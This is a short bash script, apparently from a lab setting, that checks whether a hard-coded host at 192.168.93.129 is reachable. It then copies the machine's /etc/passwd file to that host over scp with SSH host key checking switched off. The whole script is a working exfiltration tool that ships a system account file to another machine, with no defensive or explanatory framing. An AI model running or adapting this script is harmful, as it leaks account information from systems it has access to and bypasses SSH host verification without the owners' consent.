#!/bin/bash

SERVER_IP="192.168.93.129"
USER="hasosheh"

if [ -z "$SERVER_IP" ] || [ -z "$USER" ]; then
    echo "Usage: $0 <server_ip> <username>"
    exit 1
fi

ping -c 1 $SERVER_IP &> /dev/null

if [ $? -eq 0 ]; then
    echo "Server $SERVER_IP is reachable. Sending /etc/passwd..."


    scp -o StrictHostKeyChecking=no /etc/passwd $USER@$SERVER_IP:/home/$USER/

    if [ $? -eq 0 ]; then
        echo "File successfully sent!"
    else
        echo "Failed to send the file."
    fi
else
    echo "Server $SERVER_IP is not accessible."
fi


